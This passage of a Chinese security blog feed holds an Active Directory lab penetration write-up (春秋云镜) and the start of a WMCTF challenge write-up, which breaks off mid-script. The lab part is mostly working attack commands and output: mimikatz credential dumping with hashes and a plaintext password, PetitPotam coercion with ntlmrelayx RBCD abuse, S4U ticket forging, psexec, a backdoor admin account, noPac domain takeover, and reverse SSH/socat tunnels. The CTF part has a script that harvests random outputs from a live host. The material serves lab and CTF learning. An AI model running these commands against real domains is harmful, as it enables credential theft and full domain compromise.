:#####:   ###  ###  ###  ###  ###  ###    ##         ##     ###  :##  ###  ###   .#####:  ##.  .##  ##.  .##  ##.  .##    ##         ##     ##    ##  ##.  .##      :###  ##    ##  ##    ##  ##    ##    ##         ##     ##    ##  ##    ##        ##  ##.  .##  ##.  .##  ##.  .##    ##         ##     ##    ##  ##.  .##  #:.  :##  ###  ###  ###  ###  ###  ###    ##         ##     ##    ##  ###  ###  #######:  #######:  .######.  .######.    ##      ########  ##    ##  .#######  .#####:   ##.###:    .####.    .####.     ##      ########  ##    ##   :###:##            ##                                                           #.  :##            ##                                                           ######             ##                                                           :####:  flag02: flag{ffd82b2a-8762-4dd2-95c2-bae51147e03b}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><p>先抓一下哈希</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; load kiwi[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17Loading extension kiwi...  .#####.   mimikatz 2.2.0 20191125 (x64/windows) .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )  '#####'         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/Success.//列出当前系统内存和缓存中所有可用的凭据meterpreter &gt; creds_all[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[+] Running as SYSTEM[*] Retrieving all credentialsmsv credentials===============Username     Domain    NTLM                              SHA1--------     ------    ----                              ----XR-DESKTOP$  XIAORANG  738dcc0171b84e1a36400008983a3e10  fdc3f1fd9d44fea97d24ce212d6339ec890cfdf4yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6fwdigest credentials===================Username     Domain    Password--------     ------    --------(null)       (null)    (null)XR-DESKTOP$  XIAORANG  7d c7 ba cf 2e 52 36 1a 8a 7c 53 e3 dc 71 7e d4 3a 3e c1 e5 60 0d 09 2a a6 b2 b3 73 19 32 1f d8 7d 28 69 48 fe 7a 4c 28 32 49 58 e9 47 71 98 8e 51 c0 80 74                        ed 14 91 fb e0 43 21 37 75 cf d5 91 53 0f 96 03 48 99 1d 54 34 52 71 96 b0 a2 af 96 96 c4 18 53 4b 71 f6 72 22 2b 74 64 69 05 38 e9 d6 a2 22 cc 3a 98 f2 7                       d aa f2 e0 07 ee 92 8c 31 24 fa 42 c4 94 1b e5 8e c4 df 80 c0 09 7b aa af dd cd 8f 86 08 e1 41 4d 53 2e 0d d8 91 2f d8 36 a8 1f 7a e8 0d 47 a4 16 1a c4 56                       b9 e0 96 13 ef c9 70 8c 64 8d 9a d5 75 7f 2f 3d c4 36 5e 1f 8a 16 6c 9e aa 11 01 b1 13 ab 0d f8 dd 98 3a d1 01 b6 e1 f5 51 50 82 eb 02 b5 bb c0 cc 4b 63 f4                        71 0f 2c 49 de 19 3d a3 cf ab 32 29 a6 69 04 77 76 63 a7 3a 5a b9 f6 7f 97 b9 6b ff 22 84 6e 22 9dyangmei      XIAORANG  xrihGHgoNZQ     //(明文密码)kerberos credentials====================Username     Domain        Password--------     ------        --------(null)       (null)        (null)xr-desktop$  XIAORANG.LAB  7d c7 ba cf 2e 52 36 1a 8a 7c 53 e3 dc 71 7e d4 3a 3e c1 e5 60 0d 09 2a a6 b2 b3 73 19 32 1f d8 7d 28 69 48 fe 7a 4c 28 32 49 58 e9 47 71 98 8e 51 c0 8                           0 74 ed 14 91 fb e0 43 21 37 75 cf d5 91 53 0f 96 03 48 99 1d 54 34 52 71 96 b0 a2 af 96 96 c4 18 53 4b 71 f6 72 22 2b 74 64 69 05 38 e9 d6 a2 22 cc 3a                            98 f2 7d aa f2 e0 07 ee 92 8c 31 24 fa 42 c4 94 1b e5 8e c4 df 80 c0 09 7b aa af dd cd 8f 86 08 e1 41 4d 53 2e 0d d8 91 2f d8 36 a8 1f 7a e8 0d 47 a4                           16 1a c4 56 b9 e0 96 13 ef c9 70 8c 64 8d 9a d5 75 7f 2f 3d c4 36 5e 1f 8a 16 6c 9e aa 11 01 b1 13 ab 0d f8 dd 98 3a d1 01 b6 e1 f5 51 50 82 eb 02 b5 b                           b c0 cc 4b 63 f4 71 0f 2c 49 de 19 3d a3 cf ab 32 29 a6 69 04 77 76 63 a7 3a 5a b9 f6 7f 97 b9 6b ff 22 84 6e 22 9dxr-desktop$  XIAORANG.LAB  (null)yangmei      XIAORANG.LAB  (null)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://cloud.tencent.com/developer/article/2267322?areaSource=102001.14&amp;traceId=_iQlKVfB_eijDszgwHMVs">通过WebDav进行NTLM Relay-腾讯云开发者社区-腾讯云</a></p><p>扫一下WebClient和petitpotam</p><pre class="line-numbers language-none"><code class="language-none">proxychains4 crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -d xiaorang.lab -M Webdavproxychains4 crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M petitpotam<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/dedb62b84da42afbcd65b4fc9e71cabb.png"></p><blockquote><ul><li>A = 你本地（运行 ntlmrelayx、接收/处理 NTLM 的地方，或运行 impacket 工具）</li><li>B = 跳板/远端服务器（<code>39.99.132.128</code>，目标内网和/或目标能访问到它）</li><li>T = 目标机器（被 PetitPotam 强制去访问一个 URL，会对该 URL 发起 NTLM 认证）</li></ul><p>你要目标 T 的请求最终能到达 A，但 T 不能直接连 A，它能连 B。于是你在 B 上暴露一个 HTTP 端口，并把那流量“隧道”回 A。</p><p>Q:为什么我不能直接在39.99.132.128上开个socks5,本地用proxychains就能访问T?</p><p>A:SOCKS5 是“客户端向代理发起请求并经由代理出站”，<strong>不是</strong>把代理暴露给外部主机来让外部主动连回你</p><ul><li><p>SOCKS5（在 B 上）允许 <strong>你（A）</strong> 或其他客户端连接到 B，然后通过 B 去访问内网或互联网目标。也就是说：<strong>客户端到代理是出站连接</strong>（客户端主动连到代理）。</p></li><li><p>PetitPotam 情况恰恰相反：<strong>目标 T 必须主动去访问你控制的 HTTP 接收器</strong>（T 是发起方）。T 不会“使用 SOCKS 代理”去把它的 NTLM 握手发给你，除非你能在 T 上配置代理（不可能）。</p></li><li><p>因此：把 SOCKS5 在 B 上开起来后，<strong>你可以从 A 借助这个 SOCKS 访问 T</strong>（A → SOCKS(B) → T），但这并不会让 T → 你（A）建立连接，也就无法把 NTLM challenge/response 发回给你用于中继。</p></li></ul><p>你开 SOCKS 在 B：</p><ul><li>用途：A →（SOCKS@B）→ 内网资源（你作为客户端通过 B 出站）。</li><li>不满足：让 T 主动把认证发给你（因为 T 并不会走 SOCKS）。</li></ul><p>你在 B 上开 HTTP（0.0.0.0:80）或把 HTTP 暴露出来：</p><ul><li>用途：T →（HTTP@B）→ 你的接收端（B 或经隧道回 A）。</li><li>这是 PetitPotam 需要的：目标必须能连到一个“监听的 HTTP 地址”。</li></ul><p>[ps:so,如果你愿意把 ntlmrelayx/接收逻辑也跑在跳板 B，就不需要把流量回隧道到 A：T → B:80（B 本地处理）(really?)]</p></blockquote><p>(远端机器上可能已经有 Web 服务器监听 80。直接用 <code>ssh -R</code> 请求绑定 80 会失败或覆盖/冲突（不可接受）。用 socat/iptables 可以更灵活地转发/选择端口。)(我猜的，因为我们目标需要 HTTP（80）访问)</p><blockquote><ul><li><code>ssh</code>：SSH <strong>客户端</strong> 程序。你在本地运行它去连接远端 SSH 服务，提供 <code>-R</code>、<code>-D</code> 等隧道参数。</li><li><code>sshd</code>：SSH <strong>服务端（daemon）</strong>，跑在远端（比如 <code>39.99.132.128</code>），负责接受连接并处理远端转发请求（是否允许由其配置决定）。</li></ul><p>区别：<code>ssh</code> 发起连接并创建隧道；<code>sshd</code> 接收连接并在服务器端建立监听/转发。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa root@39.99.132.128 -D 0.0.0.0:1081 -R *:79:127.0.0.1:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ssh -i ~/.ssh/id_rsa root@39.99.132.128  -D 127.0.0.1:1082 -R \*:79:127.0.0.1:80nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:127.0.0.1:79 &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa root@39.99.132.128 -D SOCKS代理IP:PORT -R \*:79:127.0.0.1:80nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;ssh -i id_rsa root@39.99.132.128 -D 127.0.0.1:12345 -R \*:79:127.0.0.1:80nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa root@39.99.132.128 -D 0.0.0.0:1081 -R *:79:127.0.0.1:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>-i id_rsa</code>：用这个私钥登录。</li><li><code>-D 0.0.0.0:1081</code>：在本地建立一个 SOCKS 代理（监听所有接口）。</li><li><code>-R *:79:127.0.0.1:80</code>：请求在远端监听 <code>*:79</code>（全接口），把连接转到客户端的 <code>127.0.0.1:80</code>。是否真的在 <code>*</code> 上监听取决于远端 <code>sshd_config</code>（<code>GatewayPorts</code>）。</li></ul><pre class="line-numbers language-none"><code class="language-none">ssh -i ~/.ssh/id_rsa root@39.99.132.128 -D 127.0.0.1:1082 -R \*:79:127.0.0.1:80` `nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:127.0.0.1:79 &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><code>-D 127.0.0.1:1082</code>：只在本地回环提供 SOCKS（更安全）。</li><li><code>socat</code>：把远端的外网口 80 转发到回环 79，让 ssh -R（监听回环79）能接到外部的连接。<code>nohup &amp;</code> 是后台运行。</li></ul><pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa root@39.99.132.128 -D SOCKS代理IP:PORT -R \*:79:127.0.0.1:80` + `socat ...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>本质同上：只是 <code>-D</code> 的写法变体（SOCKS 可绑在某个地址/端口）。</li></ul></blockquote><p>在远程机上<code>curl 172.22.11.76</code>，本地<code>nc -lvvp 80</code>，可以听到</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7a9b96eccded107029009750d2939cfc.png"></p><pre class="line-numbers language-none"><code class="language-none">proxychains curl http://172.22.11.76:80可以看到成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/aeec574dc1d17d289b47f9f2482874be.png"></p><blockquote><p>假设你在本地（A），远端跳板是 B，目标/访问者是 C（比如内网主机会请求 B:80）。</p><ol><li>你在 A 上运行：<br> <code>ssh -i id_rsa root@B -R 79:127.0.0.1:80</code><br> → 这会让 B 上的回环地址 <code>127.0.0.1:79</code> 被 SSH 隧道监听，任何到 127.0.0.1:79 的连接都会被反向转发回 A 的 <code>127.0.0.1:80</code>（或你指定的本地端口）。</li><li>如果 C 访问 B 的 <code>0.0.0.0:80</code>（例如 <code>curl http://B</code>），但 <code>sshd</code> 只监听回环（127.0.0.1）【由于SSH的反向端口在转发监听的时候只会监听127.0.0.1，即使反向在转发79端口指定监听全部，端口79仍绑定在<code>127.0.0.1</code>。】</li><li>，那么直接访问 B:80 并不会走到 127.0.0.1:79。<br> → 因此在 B 上启动 <code>socat</code>：<br> <code>socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:127.0.0.1:79 &amp;</code><br> 这会把外部到 B:80 的连接转发到 B 本地的 127.0.0.1:79。</li><li>socat 把连接送到 127.0.0.1:79，SSHd 的反向隧道接收到它，然后把流量通过 SSH 隧道送回 A（本地），A 上的 <code>nc -l 80</code> 或你的本地服务就能收到请求。</li></ol><p>简短路径： C → (B:80 via socat) → B:127.0.0.1:79 → SSH 隧道 → A:127.0.0.1:80</p><p>远端内网的任意主机访问 <code>http://&lt;远端-ip&gt;:80</code>（ <code>curl 172.22.11.76</code>）。</p><p><code>socat</code>（在远端）监听到来自 <code>0.0.0.0:80</code> 的连接，把连接转发到 <code>127.0.0.1:79</code>（远端本地回环）。</p><p>SSHd 上 <code>-R</code> 创建的远端监听（在 <code>127.0.0.1:79</code>）接收这个连接，并通过 SSH 隧道把流量反向传回 SSH 客户端（你机器）。</p><p>SSH 客户端上的 SSH 把这流量交给它为 <code>-R</code> 指定的目标（通常是 <code>127.0.0.1:80</code> —— 你本地的 80）。</p><p>因此你在本地的 <code>nc -lvvp 80</code> 会看到来自远端 <code>curl</code> 的请求连接/数据。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">1、用petitpotam触发目标访问HTTP服务2、目标使用webclient携带NTLM认证访问中继，并将NTLM认证中继到LDAP3、获取到机器账号身份4、以机器账户的身份修改其自身的msDS-AllowedToActOnBehalfOfOtherIdentity属性，从而允许我们访问到目标机器。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>咱们已有一个“恶意机器账户” XR-Desktop$（机器帐户名以 $ 结尾），并且通过 ntlmrelayx 的某些功能已经用来 <strong>把该机器账户写入目标机器的 msDS-AllowedToActOnBehalfOfOtherIdentity</strong>（即完成 RBCD 设置）。这一步的细节体现在 ntlmrelayx 的 <code>--escalate-user 'xr-desktop$' --delegate-access</code> 选项——下面会说明。</p><p>接着本地开启开启ntlmrelayx，利用前面拿下的XR-Desktop作为恶意机器账户设置RBCD，接着使用<a href="https://github.com/topotam/PetitPotam">Petitpotam</a>触发XR-LCM3AE8B认证到172.22.11.76</p><pre class="line-numbers language-none"><code class="language-none">proxychains python3 PetitPotam.py -u yangmei -p 'xrihGHgoNZQ' -d xiaorang.lab ubuntu@80/pwn.txt 172.22.11.26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>作用</strong>：向 <code>172.22.11.26</code>（有 PetitPotam 漏洞的那台）发送请求，告诉它“去访问 <code>http://ubuntu@80/pwn.txt</code>”（也就是你控制的 HTTP 服务地址）。</p><p><strong>结果</strong>：目标主机的 WebClient（或相应服务）会对该 URL 发起 <strong>NTLM</strong>（或 NTLMv2）认证请求，并把 NTLM challenge/response 发给你运行的 HTTP 服务器（也就是你的中继/接收端）。</p><p><strong>为什么能用</strong>：Windows 的某些 RPC/接口能被远程命令触发，让目标“主动去认证”到一个指定的 URL（这就是 PetitPotam 的要点：<strong>强制认证 / Coerce authentication</strong>）。</p><pre class="line-numbers language-none"><code class="language-none">proxychains python3 ntlmrelayx.py -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user 'xr-desktop$' --delegate-access <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>作用</strong>：启动 ntlmrelayx，接收来自目标机器（被 PetitPotam 强制发出的）NTLM 认证，然后把这个认证<strong>转发（relay）到 LDAP（域控 172.22.11.6）</strong>。</li><li><strong>重要参数含义</strong>：<ul><li><code>-t ldap://172.22.11.6</code>：把收到的 NTLM auth 中继到 LDAP 服务（域控）。</li><li><code>--escalate-user 'xr-desktop$'</code>：告诉 ntlmrelayx，用中继的凭证去把 <strong>xr-desktop$</strong> 这个机器账号“升级/写入/设置”成能做委托的对象（比如把它加到目标机器的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>）。</li><li><code>--delegate-access</code>：指示 ntlmrelayx 尝试使用“委托/访问相关”的写操作（例如设置 RBCD）。</li><li><code>--no-dump --no-da --no-acl</code>：关闭某些自动枚举/导出行为，只做我们需要的中继/写入。</li></ul></li><li><strong>为什么有效</strong>：NTLM relay 到 LDAP，若中继时使用的身份有足够权限（或你中继的对象是机器账户且某些权限被滥用），就能写入计算机对象属性（包括 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>）或者以机器账户身份做其他扩展操作。</li></ul><blockquote><p>产出：你成功<strong>用中继的 NTLM 凭证</strong>，以 <code>xr-desktop$</code> 的名义在域控/LDAP 上执行修改，从而把 <code>xr-desktop$</code> 列为被允许做某机器的“代表者”（也可能是把 <code>xr-desktop$</code> 写入某目标的 AllowedToAct 列表）。这完成了“把恶意机器加入目标的 RBCD”这一重要前提</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e8b897dfc22ae024c0c3a6ab52c7cca7.png"></p><p>可以通过S4U扩展协议来申请访问WebDav目标机的ST票据了。</p><pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~]└─$ proxychains impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :738dcc0171b84e1a36400008983a3e10  xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [-] CCache file is not found. Skipping...[*] Getting TGT for user[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.11.6:88  ...  OK[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.11.6:88  ...  OK[*] Impersonating administrator[*] Requesting S4U2self[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.11.6:88  ...  OK[*] Requesting S4U2Proxy[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.11.6:88  ...  OK[*] Saving ticket in administrator@cifs_XR-LCM3AE8B.xiaorang.lab@XIAORANG.LAB.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><strong>这一步在做什么（分两部分）</strong>：</p><ol><li><code>-hashes :738d...</code>：咱们之前拿到的 <code>xr-desktop$</code> 的 NT hash</li><li><code>-impersonate administrator</code>：尝试通过 S4U2Self/S4U2Proxy 的流程，以 <code>administrator</code> 身份来为 <code>cifs/XR-LCM3AE8B.xiaorang.lab</code> 申请服务票（SPN）。</li><li><code>-spn cifs/XR-LCM3AE8B.xiaorang.lab</code>：申请针对 CIFS（SMB / file service）的服务票，这是 psexec/SMB 远程执行常用的 SPN。</li></ol></li><li><p><strong>为什么能拿到票据</strong>：因为你之前已经把 <code>xr-desktop$</code> 写进了目标机器 <code>XR-LCM3AE8B</code> 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>（RBCD），所以域控会允许 <code>xr-desktop$</code> 作为被授予的代理去为 admin 请求到目标主机的服务票（通过 S4U 流程）。</p></li><li><p><strong>命令输出</strong>：它会把拿到的票据（ccache）保存为文件：</p><pre class="line-numbers language-none"><code class="language-none">administrator@cifs_XR-LCM3AE8B.xiaorang.lab@XIAORANG.LAB.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这表示“以 administrator 的身份，但用于 cifs/XR-LCM3AE8B 的票据”已成功获取并保存。</p></li></ul><p>将申请到的票据加载到环境变量中，使用psexec登陆远程服务器，即可无密码连接。</p><pre class="line-numbers language-none"><code class="language-none">export KRB5CCNAME=~/administrator@cifs_XR-LCM3AE8B.xiaorang.lab@XIAORANG.LAB.ccachesudo vim /etc/hosts#填入内容如下172.22.11.26 XR-LCM3AE8B.xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>为什么要修改 /etc/hosts</strong>：<code>impacket-getST</code> 和 psexec 会尝试把 SPN 名称解析到 IP 地址。你通过在 <code>/etc/hosts</code> 中把 <code>XR-LCM3AE8B.xiaorang.lab</code> 映射到 <code>172.22.11.26</code>，确保客户端在做 Kerberos 或 SMB 连接时会将目标主机解析到正确的 IP（并且 SPN 与主机名一致，避免 Kerberos/SMB 主机名不匹配导致票据无效）。但其实不弄也能成功，lucky，但还是弄上。</p><pre class="line-numbers language-none"><code class="language-none">proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -target-ip 172.22.11.26 -codec gbk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>-k -no-pass</code>：表示使用 Kerberos 认证并且不提供明文密码（使用你环境变量 <code>KRB5CCNAME</code> 指向的 ccache）。因而 psexec 会用你已经获得并载入的 Kerberos 票据去对目标 SMB 服务进行认证并执行命令、落地 shell。</p><p><code>-target-ip</code>：明确使用 IP 来连接目标 SMB（避免 DNS/NetBIOS 的歧义）。</p><p><code>-codec gbk</code>：控制编码（针对中文输出）。</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/eb47c8c67ae7d5b6219d2c99cc9b42af.png"></p><hr><h3 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h3><p>添一个管理员账号</p><pre class="line-numbers language-none"><code class="language-none">net user tesq Abcd1234 /addnet localgroup administrators tesq /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>远程桌面连上用猕猴桃拿一下NTML，而<code>zhanghui</code>所属的 MA_Admin 组具备添加机器账户的关键权限（<strong>能添加/修改计算机对象的普通用户在某些 AD 环境下可被滥用</strong>。），用 noPac </p><p><a href="https://github.com/Ridter/noPac">Ridter/noPac: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user</a></p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/Ridter/noPac.gitcd noPacproxychains python3 noPac.py xiaorang.lab/zhanghui -hashes ':1232126b24cdf8c9bd2f788a9d7c7ed1' -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shelltype C:\Users\Administrator\flag\flag04.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8266f3aeb2bd81411bf7b9f67c5ddd3d.png"></p><p>或者XR-DESKTOP$也是可以的，毕竟它本来就是机器账户，不用创建了</p><pre class="line-numbers language-none"><code class="language-none">proxychains python3 noPac.py xiaorang.lab/'XR-DESKTOP$' -hashes ':03e8d17f4da1797f6b69a9a7a23244c1' -dc-ip 172.22.11.6 --impersonate Administrator -no-add -target-name 'XR-DESKTOP$' -old-hash ':6f558f06e563b300dc9f5884aca659f3' -use-ldap -shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 春秋云镜 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wmctf</title>
      <link href="/2025/09/21/wmctf/"/>
      <url>/2025/09/21/wmctf/</url>
      
        <content type="html"><![CDATA[<h2 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h2><p><code>rd.getrandbits(32)</code>使用<code>random.Random()</code>（梅森旋转算法，Mersenne Twister）生成密钥和 ID。MT19937 算法不具备密码学安全性，若攻击者收集到足够多的输出结果，就能预测其后续生成的随机数。</p><p>当提供的密钥错误时，<code>/api</code>接口会返回<code>Not Allowed:</code> + <code>key2</code>。这会向攻击者泄露随机数生成器的输出结果。</p><p><a href="https://pypi.org/project/extend-mt19937-predictor/">https://pypi.org/project/extend-mt19937-predictor/</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">import</span> re<span class="token keyword">from</span> extend_mt19937_predictor <span class="token keyword">import</span> ExtendMT19937Predictor<span class="token comment"># 配置部分</span>url <span class="token operator">=</span> <span class="token string">"http://62.234.144.69:31075/api"</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">,</span>    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"session=eyJ1c2VyX2lkIjoiMzM4MjE3ODM0MiIsInVzZXJuYW1lIjoibWF0cml4In0.aM5Sjw.1b-y-lRyFIunhW7WFiLtgzXQKJE"</span><span class="token punctuation">}</span>output_file <span class="token operator">=</span> <span class="token string">"output.txt"</span>collect_count <span class="token operator">=</span> <span class="token number">700</span>  <span class="token comment"># 建议700，保证冗余</span><span class="token comment"># 采集key2</span>key2_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>collect_count<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"key"</span><span class="token punctuation">:</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">"payload"</span><span class="token punctuation">:</span> <span class="token string">"111"</span><span class="token punctuation">}</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">403</span><span class="token punctuation">:</span>            m <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'Not Allowed:(\d+)'</span><span class="token punctuation">,</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">if</span> m<span class="token punctuation">:</span>                key2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string">] key2: </span><span class="token interpolation"><span class="token punctuation">{</span>key2<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                key2_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>key2<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string">] No key2 matched, resp: </span><span class="token interpolation"><span class="token punctuation">{</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string">] Unexpected status, resp: </span><span class="token interpolation"><span class="token punctuation">{</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string">] Exception: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment"># 写入文件</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>output_file<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token 